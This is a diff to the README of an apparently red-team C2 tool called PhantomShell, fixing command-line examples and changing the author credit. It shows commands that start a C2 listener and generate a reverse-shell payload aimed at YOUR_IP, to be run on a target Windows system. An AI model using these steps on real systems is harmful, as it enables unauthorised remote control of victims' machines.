@@ -96,7 +96,7 @@ cd PhantomShell
 ## Start the C2 Server
 
 ```bash
-python3 phantomc2.py c2 --port 4444 --web-port 8080 --password StrongPassword
+python3 phantomc2.py --port 4444 --web-port 8080 --password StrongPassword
 ```
 
 This launches:
@@ -109,7 +109,7 @@ This launches:
 ## Generate Reverse Shell Payload
 
 ```bash
-python3 phantomc2.py revshell -i YOUR_IP -p 4444
+python3 phantomshell.py revshell -i YOUR_IP -p 4444
 ```
 
 Copy the generated command and execute it on the **target Windows system**.
@@ -147,7 +147,7 @@ python3 phantomc2.py c2
 Example:
 
 ```bash
-python3 phantomc2.py c2 --port 4444 --web-port 8080 --password RedTeam2026
+python3 phantomc2.py --port 4444 --web-port 8080 --password RedTeam2026
 ```
 
 ---
@@ -393,9 +393,9 @@ Inspirations include:
 
 # 👨‍💻 Author
 
-**Adrien Dodin**
+**Dodin Mel Adrien Lawrence Enzo**
 
-Cybersecurity | Offensive Security | Red Teaming
+Offensive Security | Red Teaming
 
 🔗 LinkedIn  
 https://www.linkedin.com/in/dodin-mel-adrien-lawrence-enzo-5568b91b5/
